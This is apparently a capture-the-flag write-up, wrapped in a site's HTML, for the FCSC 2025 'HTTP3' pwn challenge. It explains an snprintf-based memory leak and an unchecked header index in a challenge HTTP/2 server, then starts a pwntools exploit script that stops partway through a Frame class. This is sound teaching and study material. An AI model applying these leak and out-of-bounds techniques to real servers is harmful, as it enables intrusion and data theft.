@@ -1,0 +1,409 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>0xb0tm4n&#x27;s website</title>
+  <script src="https://cdn.jsdelivr.net/npm/js-cookie@3.0.5/dist/js.cookie.min.js"
+    integrity="sha256-WCzAhd2P6gRJF9Hv3oOOd+hFJi/QJbv+Azn4CGB8gfY=" crossorigin="anonymous" defer></script>
+  <script src="/js/index.js" defer></script>
+  <script src="/js/prompt.js" defer></script>
+  <script src="/js/keyboard.js" defer></script>
+  <script src="/js/tab.js" defer></script>
+  <script src="/js/commands.js" defer></script>
+  <script src="/js/config.js" defer></script><link rel="stylesheet" href="/css/base.css"><link rel="stylesheet" href="/css/page.css"></head><body onkeydown='exec(event)' style='background-image: url("/assets/background.jpg");'><main>
+      <div class="files" id="files" tabindex="0">
+<ul>
+  <li class="file">
+    <span><a href='https://super-botman.github.io/readme/'
+      tabindex="0">  README</a></span>
+  </li>
+
+<li class="folder"><span>
+      <a href='https://super-botman.github.io/pwn/'
+        tabindex="0">  Pwn
+      </a>
+    </span>
+
+    <ul>
+      
+      
+        
+        
+          
+<li>
+<span>└──
+  <a href='https://super-botman.github.io/pwn/writeups/'
+    tabindex="0">  Writeups
+  </a>
+</span>
+
+
+  <ul>
+
+  
+  <li class="file">
+    <span>└──
+      <a href='https://super-botman.github.io/pwn/writeups/robot/'
+        tabindex="0">  FCSC 2023 | Robot</a>
+    </span>
+  </li><li class="file">
+    <span>└──
+      <a href='https://super-botman.github.io/pwn/writeups/bigorneau/'
+        tabindex="0">  FCSC 2025 | Bigorneau</a>
+    </span>
+  </li><li class="file">
+    <span>└──
+      <a class="selected"href='https://super-botman.github.io/pwn/writeups/http3/'
+        tabindex="0">  FCSC 2025 | HTTP3</a>
+    </span>
+  </li><li class="file">
+    <span>└──
+      <a href='https://super-botman.github.io/pwn/writeups/small-prime-shellcode/'
+        tabindex="0">  FCSC 2025 | Small Prime Shellcode</a>
+    </span>
+  </li><li class="file">
+    <span>└──
+      <a href='https://super-botman.github.io/pwn/writeups/aarchibald/'
+        tabindex="0">  Hackropole | Aarchibald</a>
+    </span>
+  </li><li class="file">
+    <span>└──
+      <a href='https://super-botman.github.io/pwn/writeups/alfred/'
+        tabindex="0">  Hackropole | Alfred</a>
+    </span>
+  </li><li class="file">
+    <span>└──
+      <a href='https://super-botman.github.io/pwn/writeups/armigo/'
+        tabindex="0">  Hackropole | Armigo</a>
+    </span>
+  </li><li class="file">
+    <span>└──
+      <a href='https://super-botman.github.io/pwn/writeups/pwn103/'
+        tabindex="0">  THM | pwn101 task 103</a>
+    </span>
+  </li></ul>
+</li>
+
+        
+    </ul>
+  </li><li class="folder"><span>
+      <a href='https://super-botman.github.io/web/'
+        tabindex="0">  Web
+      </a>
+    </span>
+
+    <ul>
+      
+      
+        
+        
+          
+<li>
+<span>└──
+  <a href='https://super-botman.github.io/web/writeups/'
+    tabindex="0">  Writeups
+  </a>
+</span>
+
+
+  <ul>
+
+  
+  <li class="file">
+    <span>└──
+      <a href='https://super-botman.github.io/web/writeups/boiler/'
+        tabindex="0">  THM | Boiler</a>
+    </span>
+  </li><li class="file">
+    <span>└──
+      <a href='https://super-botman.github.io/web/writeups/thomghost/'
+        tabindex="0">  THM | Thomghost</a>
+    </span>
+  </li></ul>
+</li>
+
+        
+    </ul>
+  </li>
+</ul>
+</div>
+      <div class="viewer page" id="viewer" tabindex="0">
+        <div class="tab">
+<div class="file-manager" onclick='document.getElementById("files").classList.toggle("open"); document.getElementById("content").classList.toggle("close")'> </div>
+<ul id="tabs">
+</ul>
+
+
+</div>
+        <div class="content" id="content"><h1 id="pwn-http3-fcsc-2025">[Pwn] HTTP3 |  FCSC 2025</h1>
+<ul>
+<li><a href="https://super-botman.github.io/pwn/writeups/http3/#checksecs">1. Checksec</a></li>
+<li><a href="https://super-botman.github.io/pwn/writeups/http3/#writeup">2. Writeup</a></li>
+<li><a href="https://super-botman.github.io/pwn/writeups/http3/#full-exploit">3. Full exploit</a></li>
+</ul>
+<h2 id="checksecs">Checksecs</h2>
+<pre style="background-color:#1a1b26;color:#c0caf5;"><code><span>[*] &#39;/home/botman/Documents/challenges/FCSC/pwn/http3/libc-2.39.so&#39;
+</span><span>    Arch:       amd64-64-little
+</span><span>    RELRO:      Full RELRO
+</span><span>    Stack:      Canary found
+</span><span>    NX:         NX enabled
+</span><span>    PIE:        PIE enabled
+</span><span>    FORTIFY:    Enabled
+</span><span>    SHSTK:      Enabled
+</span><span>    IBT:        Enabled
+</span><span>[*] &#39;/home/botman/Documents/challenges/FCSC/pwn/http3/ld-2.39.so&#39;
+</span><span>    Arch:       amd64-64-little
+</span><span>    RELRO:      Full RELRO
+</span><span>    Stack:      No canary found
+</span><span>    NX:         NX enabled
+</span><span>    PIE:        PIE enabled
+</span><span>    SHSTK:      Enabled
+</span><span>    IBT:        Enabled
+</span><span>[*] &#39;/home/botman/Documents/challenges/FCSC/pwn/http3/http3&#39;
+</span><span>    Arch:       amd64-64-little
+</span><span>    RELRO:      Full RELRO
+</span><span>    Stack:      Canary found
+</span><span>    NX:         NX enabled
+</span><span>    PIE:        PIE enabled
+</span><span>    RUNPATH:    b&#39;.&#39;
+</span><span>    SHSTK:      Enabled
+</span><span>    IBT:        Enabled
+</span><span>    Stripped:   No
+</span></code></pre>
+<h2 id="tl-dr">TL;DR</h2>
+<p>Objective: read the flag stored into the heap</p>
+<p>Solution:</p>
+<ul>
+<li>leak using duplicate header error</li>
+<li>create a fake header pointing to flag</li>
+<li>use oob to select fake header</li>
+<li>show it using duplicate header</li>
+</ul>
+<h2 id="writeup">Writeup</h2>
+<p>This challenge was the 3rd of a series about http servers based, this time it was based on <a href="https://www.rfc-editor.org/rfc/rfc7540">HTTP/2 protocole</a>. The objective of this chall was to leak the heap and read the flag from it.</p>
+<h3 id="the-leak">The leak</h3>
+<p>The first thing to find any leak it to start by searching for functions that return data to the user and check if there is any bad data handling like some way of returning more data than it normally would have.</p>
+<p>So I begin with a little <code>grep -n -P 'print|write|put' src/*</code> to have an idea of where I can find interesting code:
+<img src="/images/http3/grep_write.png" alt="grep write/put/print in src" /></p>
+<p>I will first take a look at the snprintf code because it seems to return some user-controlled data</p>
+<pre data-lang="c" style="background-color:#1a1b26;color:#c0caf5;" class="language-c "><code class="language-c" data-lang="c"><span style="font-style:italic;color:#9d7cd8;">static </span><span style="color:#bb9af7;">bool </span><span style="color:#7aa2f7;">handleHeaders</span><span style="color:#9abdf5;">(</span><span style="color:#bb9af7;">int </span><span style="color:#e0af68;">tx</span><span style="color:#89ddff;">, </span><span style="font-style:italic;color:#9d7cd8;">const </span><span style="color:#bb9af7;">char </span><span style="color:#89ddff;">*</span><span style="color:#e0af68;">flag</span><span style="color:#89ddff;">, </span><span style="color:#0db9d7;">size_t </span><span style="color:#e0af68;">id</span><span style="color:#89ddff;">, </span><span style="font-style:italic;color:#9d7cd8;">const </span><span style="color:#bb9af7;">struct</span><span> headers </span><span style="color:#89ddff;">*</span><span style="color:#e0af68;">headers</span><span style="color:#9abdf5;">) {
+</span><span style="color:#9abdf5;">    </span><span style="color:#89ddff;">...
+</span><span style="color:#9abdf5;">    </span><span style="color:#bb9af7;">for </span><span style="color:#9abdf5;">(</span><span style="color:#0db9d7;">size_t</span><span style="color:#9abdf5;"> j </span><span style="color:#89ddff;">= </span><span style="color:#ff9e64;">0</span><span style="color:#89ddff;">;</span><span style="color:#9abdf5;"> j </span><span style="color:#bb9af7;">&lt;</span><span style="color:#9abdf5;"> i</span><span style="color:#89ddff;">;</span><span style="color:#9abdf5;"> j</span><span style="color:#89ddff;">++</span><span style="color:#9abdf5;">) {
+</span><span style="color:#9abdf5;">      </span><span style="color:#bb9af7;">if </span><span style="color:#9abdf5;">(</span><span style="color:#7aa2f7;">string_eq</span><span style="color:#9abdf5;">(</span><span style="color:#89ddff;">&amp;</span><span style="color:#7aa2f7;">headers</span><span style="color:#89ddff;">-&gt;</span><span style="color:#7aa2f7;">headers</span><span style="color:#9abdf5;">[</span><span style="color:#7aa2f7;">j</span><span style="color:#9abdf5;">]</span><span style="color:#89ddff;">.</span><span style="color:#7dcfff;">key</span><span style="color:#89ddff;">,</span><span style="color:#7aa2f7;"> key</span><span style="color:#89ddff;">-&gt;</span><span style="color:#7aa2f7;">size</span><span style="color:#89ddff;">,</span><span style="color:#7aa2f7;"> key</span><span style="color:#89ddff;">-&gt;</span><span style="color:#7aa2f7;">data</span><span style="color:#9abdf5;">)) {
+</span><span style="color:#9abdf5;">        </span><span style="color:#bb9af7;">char</span><span style="color:#9abdf5;"> body[</span><span style="color:#89ddff;">0x</span><span style="color:#ff9e64;">100</span><span style="color:#9abdf5;">]</span><span style="color:#89ddff;">;
+</span><span style="color:#9abdf5;">
+</span><span style="color:#9abdf5;">        </span><span style="color:#0db9d7;">ssize_t</span><span style="color:#9abdf5;"> size </span><span style="color:#89ddff;">= </span><span style="color:#2ac3de;">snprintf</span><span style="color:#9abdf5;">(</span><span style="color:#7aa2f7;">body</span><span style="color:#89ddff;">, sizeof</span><span style="color:#9abdf5;">(</span><span style="color:#7aa2f7;">body</span><span style="color:#9abdf5;">)</span><span style="color:#89ddff;">, &quot;</span><span style="color:#9ece6a;">Duplicate header: </span><span>%.*s</span><span style="color:#89ddff;">&quot;,
+</span><span style="color:#7aa2f7;">                                </span><span style="color:#9abdf5;">(</span><span style="color:#bb9af7;">int</span><span style="color:#9abdf5;">)</span><span style="color:#7aa2f7;">key</span><span style="color:#89ddff;">-&gt;</span><span style="color:#7aa2f7;">size</span><span style="color:#89ddff;">,</span><span style="color:#7aa2f7;"> key</span><span style="color:#89ddff;">-&gt;</span><span style="color:#7aa2f7;">data</span><span style="color:#9abdf5;">)</span><span style="color:#89ddff;">;
+</span><span style="color:#9abdf5;">
+</span><span style="color:#9abdf5;">        </span><span style="color:#7aa2f7;">err400</span><span style="color:#9abdf5;">(</span><span style="color:#7aa2f7;">tx</span><span style="color:#89ddff;">,</span><span style="color:#7aa2f7;"> id</span><span style="color:#89ddff;">,</span><span style="color:#7aa2f7;"> size</span><span style="color:#89ddff;">,</span><span style="color:#7aa2f7;"> body</span><span style="color:#9abdf5;">)</span><span style="color:#89ddff;">;
+</span><span style="color:#9abdf5;">        </span><span style="font-style:italic;color:#bb9af7;">return </span><span style="color:#ff9e64;">false</span><span style="color:#89ddff;">;
+</span><span style="color:#9abdf5;">      }
+</span><span style="color:#9abdf5;">    }
+</span><span style="color:#9abdf5;">   </span><span style="color:#89ddff;">...
+</span><span style="color:#9abdf5;">}
+</span></code></pre>
+<p>So what we see is that if any headers are duplicated in our request, the server will return a 400 err response with the name of the duplicated header, the interesting part is that we can controle the value of <code>key-&gt;size</code> and <code>key-&gt;data</code> so maybe we'll be able to leak to data using this function, the first thing to do in this case is to take a look at the man page of our possibly vunlerable function:</p>
+<p><img src="/images/http3/man.png" alt="snprintf man page" />
+And boom, we found the vuln, as you can see if the input buffer as to be truncated <code>snprintf</code> doesn't return the actual numbers of bytes wrote but the <code>key-&gt;size</code> value, so if we send a header name bigger than 0x100 we'll be able to leak the data after our body variable so we'll be able to leak the stack and maybe some heap addresses.</p>
+<h3 id="oob">OOB</h3>
+<p>Now that we have a way to leak our heap address the only thing left is to find a way to print our flag, to do so we'll use the error handler again as it's the only way we have to print data that we control, so starting from that we have to find a way to modify the <code>key-&gt;data</code> pointer to point it into our flag.</p>
+<p>To do so I will begin by looking at the source of the key struct with this little grep <code>grep -n -P 'key' src/*</code>
+<img src="/images/http3/grep_key.png" alt="grep key in src" />
+We can directly see that the <code>key</code> is populated by <code>getIndexed</code> function so we can take a look at it</p>
+<pre data-lang="c" style="background-color:#1a1b26;color:#c0caf5;" class="language-c "><code class="language-c" data-lang="c"><span style="font-style:italic;color:#9d7cd8;">static const </span><span style="color:#bb9af7;">struct</span><span> header </span><span style="color:#89ddff;">*</span><span style="color:#7aa2f7;">getIndexed</span><span style="color:#9abdf5;">(</span><span style="font-style:italic;color:#9d7cd8;">const </span><span style="color:#bb9af7;">struct</span><span> header </span><span style="color:#89ddff;">*</span><span style="color:#e0af68;">table</span><span style="color:#89ddff;">, </span><span style="color:#0db9d7;">size_t </span><span style="color:#e0af68;">idx</span><span style="color:#9abdf5;">) {
+</span><span style="color:#9abdf5;">  </span><span style="color:#bb9af7;">if </span><span style="color:#9abdf5;">(</span><span style="color:#ff9e64;">0 </span><span style="color:#bb9af7;">==</span><span style="color:#9abdf5;"> idx)
+</span><span style="color:#9abdf5;">    </span><span style="font-style:italic;color:#bb9af7;">return </span><span style="color:#ff9e64;">NULL</span><span style="color:#89ddff;">;
+</span><span style="color:#9abdf5;">
+</span><span style="color:#9abdf5;">  </span><span style="font-style:italic;color:#9d7cd8;">const </span><span style="color:#0db9d7;">size_t</span><span style="color:#9abdf5;"> s </span><span style="color:#89ddff;">= sizeof</span><span style="color:#9abdf5;">(headers) </span><span style="color:#89ddff;">/ sizeof</span><span style="color:#9abdf5;">(</span><span style="color:#89ddff;">*</span><span style="color:#9abdf5;">headers)</span><span style="color:#89ddff;">;
+</span><span style="color:#9abdf5;">
+</span><span style="color:#9abdf5;">  </span><span style="color:#bb9af7;">if </span><span style="color:#9abdf5;">(idx </span><span style="color:#89ddff;">- </span><span style="color:#ff9e64;">1 </span><span style="color:#bb9af7;">&lt;</span><span style="color:#9abdf5;"> s)
+</span><span style="color:#9abdf5;">    </span><span style="font-style:italic;color:#bb9af7;">return </span><span style="color:#89ddff;">&amp;</span><span style="color:#9abdf5;">headers[idx </span><span style="color:#89ddff;">- </span><span style="color:#ff9e64;">1</span><span style="color:#9abdf5;">]</span><span style="color:#89ddff;">;
+</span><span style="color:#9abdf5;">
+</span><span style="color:#9abdf5;">  </span><span style="font-style:italic;color:#bb9af7;">return </span><span style="color:#89ddff;">&amp;</span><span style="color:#9abdf5;">table[idx </span><span style="color:#89ddff;">- </span><span style="color:#ff9e64;">1 </span><span style="color:#89ddff;">-</span><span style="color:#9abdf5;"> s]</span><span style="color:#89ddff;">;
+</span><span style="color:#9abdf5;">}
+</span></code></pre>
+<p>As we can see the idx param do not seems to have any verification in this function so maybe if we control it we'll be able to get any value we want in the heap and it will be interpreted as a header, so now we have to check how the idx value is obtained, and all of that is happening in the core of the challenge, the terrifying <code>parse</code> function.</p>
+<p>For an easier analysis I will simplify parts of the code.</p>
+<pre data-lang="c" style="background-color:#1a1b26;color:#c0caf5;" class="language-c "><code class="language-c" data-lang="c"><span>
+</span><span style="color:#bb9af7;">struct</span><span> headers </span><span style="color:#89ddff;">*</span><span style="color:#7aa2f7;">parse</span><span style="color:#9abdf5;">(</span><span style="color:#bb9af7;">struct</span><span> header </span><span style="color:#89ddff;">*</span><span style="color:#e0af68;">table</span><span style="color:#89ddff;">, </span><span style="color:#0db9d7;">size_t </span><span style="color:#e0af68;">size</span><span style="color:#89ddff;">, </span><span style="font-style:italic;color:#9d7cd8;">const </span><span style="color:#bb9af7;">char </span><span style="color:#e0af68;">data</span><span style="color:#9abdf5;">[</span><span style="font-style:italic;color:#9d7cd8;">static</span><span> size</span><span style="color:#9abdf5;">]) {
+</span><span style="color:#9abdf5;">  </span><span style="color:#bb9af7;">struct</span><span style="color:#9abdf5;"> state state </span><span style="color:#89ddff;">= </span><span style="color:#9abdf5;">{
+</span><span style="color:#9abdf5;">      </span><span style="color:#89ddff;">.</span><span style="color:#7dcfff;">data </span><span style="color:#89ddff;">=</span><span style="color:#9abdf5;"> data</span><span style="color:#89ddff;">,
+</span><span style="color:#9abdf5;">      </span><span style="color:#89ddff;">.</span><span style="color:#7dcfff;">size </span><span style="color:#89ddff;">= </span><span style="color:#ff9e64;">8 </span><span style="color:#89ddff;">*</span><span style="color:#9abdf5;"> size</span><span style="color:#89ddff;">,
+</span><span style="color:#9abdf5;">  }</span><span style="color:#89ddff;">;
+</span><span style="color:#9abdf5;">
+</span><span style="color:#9abdf5;">  </span><span style="color:#bb9af7;">while </span><span style="color:#9abdf5;">(state</span><span style="color:#89ddff;">.</span><span style="color:#7dcfff;">pos </span><span style="color:#bb9af7;">&lt;</span><span style="color:#9abdf5;"> state</span><span style="color:#89ddff;">.</span><span style="color:#7dcfff;">size</span><span style="color:#9abdf5;">) {
+</span><span style="color:#9abdf5;">    </span><span style="color:#0db9d7;">size_t</span><span style="color:#9abdf5;"> type</span><span style="color:#89ddff;">;
+</span><span style="color:#9abdf5;">
+</span><span style="color:#9abdf5;">    </span><span style="color:#bb9af7;">for </span><span style="color:#9abdf5;">(type </span><span style="color:#89ddff;">= </span><span style="color:#ff9e64;">0</span><span style="color:#89ddff;">;</span><span style="color:#9abdf5;"> type </span><span style="color:#bb9af7;">&lt; </span><span style="color:#ff9e64;">4</span><span style="color:#89ddff;">;</span><span style="color:#9abdf5;"> type</span><span style="color:#89ddff;">++</span><span style="color:#9abdf5;">) {
+</span><span style="color:#9abdf5;">      </span><span style="color:#bb9af7;">bool</span><span style="color:#9abdf5;"> b</span><span style="color:#89ddff;">;
+</span><span style="color:#9abdf5;">
+</span><span style="color:#9abdf5;">      </span><span style="color:#bb9af7;">if </span><span style="color:#9abdf5;">(</span><span style="color:#89ddff;">!</span><span style="color:#7aa2f7;">getBit</span><span style="color:#9abdf5;">(</span><span style="color:#89ddff;">&amp;</span><span style="color:#7aa2f7;">state</span><span style="color:#89ddff;">, &amp;</span><span style="color:#7aa2f7;">b</span><span style="color:#9abdf5;">))
+</span><span style="color:#9abdf5;">        </span><span style="font-style:italic;color:#bb9af7;">goto</span><span style="color:#9abdf5;"> err</span><span style="color:#89ddff;">;
+</span><span style="color:#9abdf5;">
+</span><span style="color:#9abdf5;">      </span><span style="color:#bb9af7;">if </span><span style="color:#9abdf5;">(b)
+</span><span style="color:#9abdf5;">        </span><span style="font-style:italic;color:#bb9af7;">break</span><span style="color:#89ddff;">;
+</span><span style="color:#9abdf5;">    }
+</span><span style="color:#9abdf5;">
+</span><span style="color:#9abdf5;">    </span><span style="color:#bb9af7;">if </span><span style="color:#9abdf5;">(</span><span style="color:#ff9e64;">0 </span><span style="color:#bb9af7;">==</span><span style="color:#9abdf5;"> type){
+</span><span style="color:#9abdf5;">      </span><span style="color:#0db9d7;">size_t</span><span style="color:#9abdf5;"> n</span><span style="color:#89ddff;">;
+</span><span style="color:#9abdf5;">      </span><span style="color:#bb9af7;">if </span><span style="color:#9abdf5;">(</span><span style="color:#89ddff;">!</span><span style="color:#7aa2f7;">getVarint</span><span style="color:#9abdf5;">(</span><span style="color:#89ddff;">&amp;</span><span style="color:#7aa2f7;">state</span><span style="color:#89ddff;">, &amp;</span><span style="color:#7aa2f7;">n</span><span style="color:#9abdf5;">))
+</span><span style="color:#9abdf5;">        </span><span style="font-style:italic;color:#bb9af7;">goto</span><span style="color:#9abdf5;"> err</span><span style="color:#89ddff;">;
+</span><span style="color:#9abdf5;">
+</span><span style="color:#9abdf5;">      </span><span style="color:#bb9af7;">if </span><span style="color:#9abdf5;">(</span><span style="color:#ff9e64;">0 </span><span style="color:#bb9af7;">==</span><span style="color:#9abdf5;"> n)
+</span><span style="color:#9abdf5;">        </span><span style="font-style:italic;color:#bb9af7;">goto</span><span style="color:#9abdf5;"> err</span><span style="color:#89ddff;">;
+</span><span style="color:#9abdf5;">
+</span><span style="color:#9abdf5;">      </span><span style="color:#bb9af7;">struct</span><span style="color:#9abdf5;"> header h </span><span style="color:#89ddff;">= *</span><span style="color:#7aa2f7;">getIndexed</span><span style="color:#9abdf5;">(</span><span style="color:#7aa2f7;">table</span><span style="color:#89ddff;">,</span><span style="color:#7aa2f7;"> n</span><span style="color:#9abdf5;">)</span><span style="color:#89ddff;">;
+</span><span style="color:#9abdf5;">
+</span><span style="color:#9abdf5;">      </span><span style="color:#bb9af7;">if </span><span style="color:#9abdf5;">(</span><span style="color:#89ddff;">!</span><span style="color:#7aa2f7;">string_dup</span><span style="color:#9abdf5;">(</span><span style="color:#89ddff;">&amp;</span><span style="color:#7aa2f7;">h</span><span style="color:#89ddff;">.</span><span style="color:#7dcfff;">key</span><span style="color:#89ddff;">, &amp;</span><span style="color:#7aa2f7;">h</span><span style="color:#89ddff;">.</span><span style="color:#7dcfff;">key</span><span style="color:#9abdf5;">))
+</span><span style="color:#9abdf5;">        </span><span style="font-style:italic;color:#bb9af7;">goto</span><span style="color:#9abdf5;"> err</span><span style="color:#89ddff;">;
+</span><span style="color:#9abdf5;">
+</span><span style="color:#9abdf5;">      </span><span style="color:#bb9af7;">if </span><span style="color:#9abdf5;">(</span><span style="color:#89ddff;">!</span><span style="color:#7aa2f7;">string_dup</span><span style="color:#9abdf5;">(</span><span style="color:#89ddff;">&amp;</span><span style="color:#7aa2f7;">h</span><span style="color:#89ddff;">.</span><span style="color:#7dcfff;">value</span><span style="color:#89ddff;">, &amp;</span><span style="color:#7aa2f7;">h</span><span style="color:#89ddff;">.</span><span style="color:#7dcfff;">value</span><span style="color:#9abdf5;">))
+</span><span style="color:#9abdf5;">        </span><span style="font-style:italic;color:#bb9af7;">goto</span><span style="color:#9abdf5;"> err</span><span style="color:#89ddff;">;
+</span><span style="color:#9abdf5;">
+</span><span style="color:#9abdf5;">      ret </span><span style="color:#89ddff;">= </span><span style="color:#7aa2f7;">headers_push</span><span style="color:#9abdf5;">(</span><span style="color:#7aa2f7;">ret</span><span style="color:#89ddff;">, &amp;</span><span style="color:#7aa2f7;">h</span><span style="color:#9abdf5;">)</span><span style="color:#89ddff;">;
+</span><span style="color:#9abdf5;">      </span><span style="color:#bb9af7;">if </span><span style="color:#9abdf5;">(</span><span style="color:#ff9e64;">NULL </span><span style="color:#bb9af7;">==</span><span style="color:#9abdf5;"> ret)
+</span><span style="color:#9abdf5;">        </span><span style="font-style:italic;color:#bb9af7;">return </span><span style="color:#ff9e64;">NULL</span><span style="color:#89ddff;">;
+</span><span style="color:#9abdf5;">    } </span><span style="color:#bb9af7;">else if </span><span style="color:#9abdf5;">(</span><span style="color:#ff9e64;">2 </span><span style="color:#bb9af7;">==</span><span style="color:#9abdf5;"> type) {
+</span><span style="color:#9abdf5;">      </span><span style="color:#89ddff;">...
+</span><span style="color:#9abdf5;">    }
+</span><span style="color:#9abdf5;">    </span><span style="color:#bb9af7;">else </span><span style="color:#9abdf5;">{
+</span><span style="color:#9abdf5;">      </span><span style="color:#89ddff;">...
+</span><span style="color:#9abdf5;">    }
+</span><span style="color:#9abdf5;">  }
+</span><span style="color:#9abdf5;">}
+</span></code></pre>
+<p>Basically the parse function will determine the type of header by looking at the numbers of bits sets in the first byte, type 0 is encoded as <code>0b10000000</code>, type 1 <code>0b11000000</code>, ... And each type have a function, so 0 is simply an indexed header, that means that the header returned will be the header at the index specified after the type bits, for example if you want to specify the header <code>:method GET</code> you'll have to send the header <code>0x80 | 0x1</code> with <code>0x80</code> as the header type and <code>0x1</code> the index of the header in the headers table.</p>
+<p>And we can see that before there is not verifications of the <code>n</code> variable so we found our second vulns, now we just have to add all of this together and write an exploit that will:</p>
+<ul>
+<li>leak the heap address and the flag address</li>
+<li>write a fake header into the heap using the type 3 which allow us to add new custom headers into the header table</li>
+<li>find the correct offset and use the oob to fetch our fake header which point to our flag twice so we trigger the error and get the flag</li>
+</ul>
+<p>And here it is:</p>
+<h2 id="full-exploit">Full exploit</h2>
+<pre data-lang="py" style="background-color:#1a1b26;color:#c0caf5;" class="language-py "><code class="language-py" data-lang="py"><span style="color:#7dcfff;">from </span><span>pwn </span><span style="color:#7dcfff;">import </span><span>p32</span><span style="color:#89ddff;">, </span><span>flat</span><span style="color:#89ddff;">, </span><span>u64</span><span style="color:#89ddff;">, </span><span>p64
+</span><span style="color:#7dcfff;">from </span><span>hpack </span><span style="color:#7dcfff;">import </span><span>Encoder
+</span><span>
+</span><span style="color:#ff9e64;">CHALL </span><span style="color:#89ddff;">= &quot;</span><span style="color:#9ece6a;">./http3</span><span style="color:#89ddff;">&quot;
+</span><span style="color:#ff9e64;">LIBC </span><span style="color:#89ddff;">= &quot;</span><span style="color:#9ece6a;">./libc-2.39.so</span><span style="color:#89ddff;">&quot;
+</span><span>
+</span><span>
+</span><span style="color:#bb9af7;">class </span><span style="color:#0db9d7;">Frame</span><span style="color:#9abdf5;">():
+</span><span>    </span><span style="color:#bb9af7;">def </span><span style="color:#2ac3de;">__init__</span><span style="color:#9abdf5;">(</span><span style="color:#e0af68;">self</span><span style="color:#89ddff;">, </span><span style="color:#e0af68;">io</span><span style="color:#89ddff;">, </span><span style="color:#e0af68;">frame_type</span><span style="color:#89ddff;">, </span><span style="color:#e0af68;">flags</span><span style="color:#89ddff;">, </span><span style="color:#e0af68;">id</span><span style="color:#89ddff;">, </span><span style="color:#e0af68;">data</span><span style="color:#89ddff;">, </span><span style="color:#e0af68;">size</span><span style="color:#89ddff;">=</span><span style="color:#ff9e64;">0</span><span style="color:#9abdf5;">):
+</span><span>        </span><span style="color:#bb9af7;">if </span><span>size </span><span style="color:#bb9af7;">== </span><span style="color:#ff9e64;">0</span><span style="color:#9abdf5;">:
+</span><span>            </span><span style="color:#f7768e;">self</span><span style="color:#89ddff;">.</span><span>size </span><span style="color:#89ddff;">= </span><span style="color:#2ac3de;">len</span><span style="color:#9abdf5;">(</span><span style="color:#7aa2f7;">data</span><span style="color:#9abdf5;">)
+</span><span>        </span><span style="color:#bb9af7;">else</span><span style="color:#9abdf5;">:
+</span><span>            </span><span style="color:#f7768e;">self</span><span style="color:#89ddff;">.</span><span>size </span><span style="color:#89ddff;">= </span><span>size
+</span><span>        </span><span style="color:#f7768e;">self</span><span style="color:#89ddff;">.</span><span>frame_type </span><span style="color:#89ddff;">= </span><span>frame_type
+</span><span>        </span><span style="color:#f7768e;">self</span><span style="color:#89ddff;">.</span><span>flags </span><span style="color:#89ddff;">= </span><span>flags
+</span><span>        </span><span style="color:#f7768e;">self</span><span style="color:#89ddff;">.</span><span>id </span><span style="color:#89ddff;">= </span><span style="color:#2ac3de;">id
+</span><span>        </span><span style="color:#f7768e;">self</span><span style="color:#89ddff;">.</span><span>data </span><span style="color:#89ddff;">= </span><span>data
+</span><span>        </span><span style="color:#f7768e;">self</span><span style="color:#89ddff;">.</span><span>io </span><span style="color:#89ddff;">= </span><span>io
+</span><span>
+</span><span>    </span><span style="color:#89ddff;">@</span><span style="color:#2ac3de;">property
+</span><span>    </span><span style="color:#bb9af7;">def </span><span style="color:#7aa2f7;">header</span><span style="color:#9abdf5;">(</span><span style="color:#e0af68;">self</span><span style="color:#9abdf5;">):
+</span><span>        data </span><span style="color:#89ddff;">= </span><span style="color:#9abdf5;">[
+</span><span>            </span><span style="color:#f7768e;">self</span><span style="color:#89ddff;">.</span><span>size </span><span style="color:#bb9af7;">&gt;&gt; </span><span style="color:#ff9e64;">16</span><span style="color:#89ddff;">, </span><span style="color:#f7768e;">self</span><span style="color:#89ddff;">.</span><span>size </span><span style="color:#bb9af7;">&gt;&gt; </span><span style="color:#ff9e64;">8</span><span style="color:#89ddff;">, </span><span style="color:#f7768e;">self</span><span style="color:#89ddff;">.</span><span>size </span><span style="color:#bb9af7;">&gt;&gt; </span><span style="color:#ff9e64;">0</span><span style="color:#89ddff;">,
+</span><span>            </span><span style="color:#f7768e;">self</span><span style="color:#89ddff;">.</span><span>frame_type</span><span style="color:#89ddff;">,
+</span><span>            </span><span style="color:#f7768e;">self</span><span style="color:#89ddff;">.</span><span>flags</span><span style="color:#89ddff;">,
+</span><span>            </span><span style="color:#f7768e;">self</span><span style="color:#89ddff;">.</span><span>id </span><span style="color:#bb9af7;">&gt;&gt; </span><span style="color:#ff9e64;">24</span><span style="color:#89ddff;">, </span><span style="color:#f7768e;">self</span><span style="color:#89ddff;">.</span><span>id </span><span style="color:#bb9af7;">&gt;&gt; </span><span style="color:#ff9e64;">16</span><span style="color:#89ddff;">, </span><span style="color:#f7768e;">self</span><span style="color:#89ddff;">.</span><span>id </span><span style="color:#bb9af7;">&gt;&gt; </span><span style="color:#ff9e64;">8</span><span style="color:#89ddff;">, </span><span style="color:#f7768e;">self</span><span style="color:#89ddff;">.</span><span>id </span><span style="color:#bb9af7;">&gt;&gt; </span><span style="color:#ff9e64;">0
+</span><span>        </span><span style="color:#9abdf5;">]
+</span><span>        data </span><span style="color:#89ddff;">= </span><span style="color:#9abdf5;">[</span><span style="color:#7aa2f7;">p32</span><span style="color:#9abdf5;">(</span><span style="color:#7aa2f7;">i</span><span style="color:#89ddff;">, </span><span style="color:#e0af68;">endianness</span><span style="color:#89ddff;">=&quot;</span><span style="color:#9ece6a;">big</span><span style="color:#89ddff;">&quot;</span><span style="color:#9abdf5;">)[</span><span style="color:#89ddff;">-</span><span style="color:#ff9e64;">1</span><span style="color:#9abdf5;">] </span><span style="color:#bb9af7;">for </span><span>i </span><span style="color:#bb9af7;">in </span><span>data</span><span style="color:#9abdf5;">]
+</span><span>
+</span><span>        header </span><span style="color:#89ddff;">= </span><span style="color:#bb9af7;">b</span><span style="color:#89ddff;">&quot;&quot;.</span><span style="color:#7aa2f7;">join</span><span style="color:#9abdf5;">([</span><span style="color:#0db9d7;">int</span><span style="color:#89ddff;">.</span><span style="color:#7aa2f7;">to_bytes</span><span style="color:#9abdf5;">(</span><span style="color:#7aa2f7;">i</span><span style="color:#9abdf5;">) </span><span style="color:#bb9af7;">for </span><span style="color:#7aa2f7;">i </span><span style="color:#bb9af7;">in </span><span style="color:#7aa2f7;">data</span><span style="color:#9abdf5;">])
+</span><span>        </span><span style="font-style:italic;color:#bb9af7;">return </span><span>header
+</span><span>
